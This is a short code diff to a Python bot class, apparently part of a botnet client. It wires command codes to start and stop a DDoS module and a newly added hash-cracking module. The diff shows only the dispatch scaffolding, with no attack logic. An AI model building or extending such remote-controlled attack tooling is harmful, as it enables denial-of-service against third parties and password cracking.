@@ -5,7 +5,7 @@ Created on Dec 20, 2013
 '''
 
 from CommandParser import CommandParser
-from modules.DDoSModule import DDoSModule
+from modules import DDoSModule, HashCrackModule
 
 class Bot(object):
     """ Manages bot's operations
@@ -26,9 +26,12 @@ class Bot(object):
         """ Initializes with a client object and add feature module
             objects to the modules dictionary."""
         self.__client = client
-        ddos = DDoSModule()
+        ddos = DDoSModule.DDoSModule()
+        hcrack = HashCrackModule.HashCrackModule()
         self.__modules = {1:ddos.start,
-                          2:ddos.stop}        
+                          2:ddos.stop,
+                          3:hcrack.start,
+                          4:hcrack.stop}        
         
     def runCommand(self, cmd):
         """ Calls the module's start method with the right code.
